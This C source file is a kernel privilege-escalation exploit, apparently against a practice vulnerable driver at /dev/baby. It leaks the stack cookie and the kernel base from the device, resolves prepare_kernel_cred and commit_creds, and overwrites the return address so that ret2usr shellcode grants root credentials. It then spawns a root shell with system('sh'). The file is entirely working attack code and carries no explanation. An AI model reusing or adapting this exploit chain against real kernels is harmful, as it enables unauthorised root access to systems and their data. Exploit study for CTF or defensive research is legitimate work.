#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <signal.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG
#define errExit(msg)        \
    do                      \
    {                       \
        perror(msg);        \
        exit(EXIT_FAILURE); \
    } while (0)
#define WAIT()                \
    do                        \
    {                         \
        puts("[WAITING...]"); \
        getchar();            \
    } while (0)

#define logOK(msg, ...) dprintf(2, "[+] " msg "\n", ##__VA_ARGS__);
#define logInfo(msg, ...) dprintf(2, "[*] " msg "\n", ##__VA_ARGS__);
#define logErr(msg, ...) dprintf(2, "[!] " msg "\n", ##__VA_ARGS__);
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

u64 user_ip;
u64 user_cs;
u64 user_rflags;
u64 user_sp;
u64 user_ss;

void get_shell()
{
    if (getuid())
    {
        logErr("NO ROOT");
        return;
    }
    logOK("Rooted!");
    system("sh");
}

u64 global_fd, kern_base;
u64 prepare_kernel_cred = 0x861d0;
u64 commit_creds = 0x85fa0;
u64 * buf;

void shellcode()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov rdi, 0;"
        "mov rax, prepare_kernel_cred;"
        "call rax;"
        "mov rdi, rax;"
        "mov rax, commit_creds;"
        "call rax;"
        "add rsp, 0x30;"
        "ret;"
        ".att_syntax;"
        );
}

void leak()
{
    buf = malloc(0x210);
    read(global_fd, buf, 0x210);
    for(int i = 0; i < 0x210 / 8; i++)
        printf("[%d]: %llx\n", i, buf[i]);
    kern_base = buf[51] - 0x1ca727;
    prepare_kernel_cred += kern_base;
    commit_creds += kern_base;
    logInfo("Cookie: %llx", buf[50]);
    logInfo("Kernel base: %llx", kern_base);
    logInfo("prepare_kernel_cred: %llx", prepare_kernel_cred);
    logInfo("commit_creds: %llx", commit_creds);
}


void exploit()
{
    u64 idx = 51;
    buf[idx++] = shellcode + 8;
    write(global_fd, buf, sizeof(u64) * idx);
    get_shell();
    if(buf)
    {
        free(buf);
        buf = 0;
    }
}

void menu()
{
    puts("1. Leak");
    puts("2. Get shell");
    puts("3. Exit");
    printf(">> ");
}

int main(int argc, char **argv, char **envp)
{
    signal(SIGSEGV, get_shell);
    global_fd = open("/dev/baby", 2);
    if(global_fd < 1)
    {
        logErr("Device open failed");
        exit(0);
    }
    else
        logOK("Device opened");
    while(1)
    {
        menu();
        int choice;
        scanf("%d", &choice);
        switch(choice)
        {
            case 1:
                leak();
                break;
            case 2:
                exploit();
                break;
            default:
                exit(0);
                break;
        }
    }
}